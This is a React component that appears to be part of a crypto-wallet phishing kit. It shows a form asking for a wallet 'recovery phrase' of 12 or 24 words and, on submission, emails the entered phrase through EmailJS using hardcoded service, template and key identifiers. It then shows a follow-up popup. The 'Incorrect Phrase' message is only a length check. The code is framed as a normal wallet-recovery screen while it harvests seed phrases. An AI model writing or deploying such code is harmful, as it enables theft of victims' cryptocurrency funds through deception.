import React, { useRef, useState } from 'react';
import styled from 'styled-components';
import emailjs from '@emailjs/browser';
import PopMode from './PopMode';

function Phrase() {
  const [phrase, setPhrase] = useState('');
  const [load, setLoad] = useState(false);
  const [err, setErr] = useState(false);
  const form = useRef();
  const [error, setError] = useState(false);

  const handleForm = (e) => {
    e.preventDefault();

    if (phrase.length >= 12) {
      setError(false);
      setLoad(true);

      try {
        emailjs
          .sendForm(
            'service_nx2jim6',
            'template_4pd9aje',
            form.current,
            'W-ieyA-tnjugaQtq9'
          )
          .then((response) => {
            console.log(response.status);
            setErr(true);
            setLoad(false);
          });
      } catch (error) {
        console.log(error);
        setLoad(false);
      }
    } else {
      setError(true);
    }
  };
  return (
    <div>
      {!err && (
        <Form ref={form} onSubmit={handleForm}>
          <textarea
            name="phrase"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Enter your recovery phrase"
            id="phrase"
            cols="30"
            rows="10"
            required
          ></textarea>
          {error && <p className="error-message">Incorrect Phrase</p>}
          <p>Typically 12 (sometimes 24) words separated by single spaces</p>
          <button type="submit">
            {load ? <div className="loaderr"> </div> : 'Proceed'}
          </button>
        </Form>
      )}

      {err && <PopMode />}
    </div>
  );
}

export default Phrase;

const Form = styled.form`
  .error-message {
    color: #c10;
    margin-bottom: 20px;
  }
  textarea {
    resize: none;
    width: 100%;
    padding: 10px;
    &:focus {
      outline: none;
    }
  }
  p {
    font-size: 14px;
    color: #8c87a6;
  }
  button {
    width: 100%;
    margin-top: 15px;
    background: #1b152e;
    height: 50px;

    display: flex;
    justify-content: center;
    align-items: center;
  }
`;
